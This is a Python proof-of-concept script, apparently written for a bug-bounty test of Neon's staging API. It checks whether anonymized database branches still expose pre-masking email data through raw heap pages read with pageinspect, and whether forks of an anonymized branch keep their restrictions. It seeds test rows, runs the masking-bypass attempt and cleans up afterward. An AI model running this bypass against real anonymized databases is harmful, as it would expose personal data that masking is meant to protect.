# -*- coding: utf-8 -*-
"""ANON × MVCC-history chain: after anonymize (UPDATE), old row versions remain
in heap until vacuum.  Try pageinspect on the ANONYMIZED branch to read
pre-mask data.  If pageinspect readable by neondb_owner on anon branch
-> masking bypass by design consumers.
Also check: fork of anon branch (child) - does restricted_actions follow?
Does child contain pre-mask rows at fork LSN?
"""
import json
import time
import ssl
import http.client
import sys
import os
import binascii

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _pg import connect, query, one, exec_

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
HB = {"X-Bug-Bounty": "xxbo"}
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
LOG = r"F:\scan\neon_report\_u7_out.txt"

with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]


def call(method, path, body=None, timeout=60):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    hdrs = dict(HB, Authorization="Bearer " + APIKEY)
    if body is not None:
        hdrs["Content-Type"] = "application/json"
    conn.request(method, API_BASE + path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, data


def out(s):
    print(s, flush=True)
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(s + "\n")


def pw_of(bid):
    st, d = call("GET", "/projects/%s/connection_uri?database_name=neondb&role_name=neondb_owner&branch_id=%s" % (PA, bid))
    if st != 200:
        out("pw_of fail: %s %s" % (st, d[:200]))
        return None
    from urllib.parse import urlsplit
    u = urlsplit(json.loads(d)["uri"])
    return u.hostname, u.username, u.password


def clean_u6():
    st, d = call("GET", "/projects/%s/branches" % PA)
    for b in json.loads(d).get("branches", []):
        if b.get("name", "").startswith("u"):
            s2, d2 = call("DELETE", "/projects/%s/branches/%s" % (PA, b["id"]))
            out("clean %s %s -> %s" % (b["name"], b["id"], s2))


clean_u6()

# 1. src branch + data
st, d = call("POST", "/projects/%s/branches" % PA,
             {"branch": {"name": "u7-src", "parent_id": PAMAIN},
              "endpoints": [{"type": "read_write"}]})
SRC = json.loads(d)["branch"]["id"]
out("src=%s" % SRC)
time.sleep(5)
h, u, p = pw_of(SRC)
conn = None
for i in range(15):
    try:
        conn = connect(h, u, p)
        break
    except Exception as e:
        time.sleep(5)
exec_(conn, "create table u7_pii(id int, email text)")
exec_(conn, "insert into u7_pii values (1,'alice.real@victimcorp.com'),(2,'bob.ceo@victimcorp.com')")
out("src rows: %s" % repr(query(conn, "select * from u7_pii")))
conn.close()

# 2. anonymize branch (fork from src)
st, d = call("POST", "/projects/%s/branch_anonymized" % PA, {
    "branch_create": {"branch": {"name": "u7-anon", "parent_id": SRC},
                      "endpoints": [{"type": "read_write"}]},
    "masking_rules": [{
        "database_name": "neondb", "schema_name": "public",
        "table_name": "u7_pii", "column_name": "email",
        "masking_function": "anon.fake_email()"
    }],
    "start_anonymization": True,
})
out("anon create: %s %s" % (st, d[:200]))
ANON = json.loads(d)["branch"]["id"]
out("anon=%s" % ANON)
time.sleep(8)

# 3. connect to anon FAST (before autovacuum) and read heap via pageinspect
h2, u2, p2 = pw_of(ANON)
conn2 = None
for i in range(20):
    try:
        conn2 = connect(h2, u2, p2)
        break
    except Exception as e:
        out("anon wait %d %s" % (i, str(e)[:90]))
        time.sleep(5)
out("anon current rows: %s" % repr(query(conn2, "select * from u7_pii")))

# 3a. pageinspect availability
for sql in (
    "select extname from pg_extension",
    "select current_setting('server_version_num')",
    "select rolsuper, rolreplication, rolbypassrls from pg_roles where rolname=current_user",
):
    try:
        out("Q %s -> %s" % (sql[:60], repr(query(conn2, sql))))
    except Exception as e:
        out("Q %s FAIL %s: %s" % (sql[:60], type(e).__name__, str(e)[:150]))

try:
    exec_(conn2, "create extension if not exists pageinspect")
    out("pageinspect CREATE OK")
except Exception as e:
    out("pageinspect create FAIL: %s: %s" % (type(e).__name__, str(e)[:200]))

# 3b. raw page read
for sql in (
    "select count(*) from pageinspect.get_raw_page('u7_pii', 0)",
    "select encode(pageinspect.get_raw_page('u7_pii',0),'hex')",
):
    try:
        r = query(conn2, sql)
        out("PAGE %s -> %s" % (sql[:55], repr(r)))
        if r:
            hexd = r[0][0]
            # search for victim email substrings in hex (ascii)
            for needle in ("alice.real@victimcorp.com", "bob.ceo@victimcorp.com",
                           "victimcorp", "example.net"):
                nh = binascii.hexlify(needle.encode()).decode()
                if nh in hexd:
                    out("!!! FOUND PRE-MASK DATA IN HEAP: %s" % needle)
        break
    except Exception as e:
        out("PAGE %s FAIL: %s: %s" % (sql[:55], type(e).__name__, str(e)[:200]))
conn2.close()

# 4. fork anon branch -> child; check data + restricted_actions
st, d = call("POST", "/projects/%s/branches" % PA,
             {"branch": {"name": "u7-child", "parent_id": ANON},
              "endpoints": [{"type": "read_write"}]})
out("child create: %s %s" % (st, d[:300]))
try:
    j = json.loads(d)
    CHILD = j["branch"]["id"]
    out("child=%s restricted=%s" % (CHILD, j["branch"].get("restricted_actions")))
    h3, u3, p3 = pw_of(CHILD)
    conn3 = None
    for i in range(15):
        try:
            conn3 = connect(h3, u3, p3)
            break
        except Exception as e:
            time.sleep(5)
    out("child rows: %s" % repr(query(conn3, "select * from u7_pii")))
    conn3.close()
    st, d = call("DELETE", "/projects/%s/branches/%s" % (PA, CHILD))
    out("child cleanup -> %s" % st)
except Exception as e:
    out("child err: %s %s" % (type(e).__name__, str(e)[:150]))

# cleanup
for bid, tag in ((ANON, "u7-anon"), (SRC, "u7-src")):
    st, d = call("DELETE", "/projects/%s/branches/%s" % (PA, bid))
    out("cleanup %s -> %s" % (tag, st))
print("== DONE", flush=True)
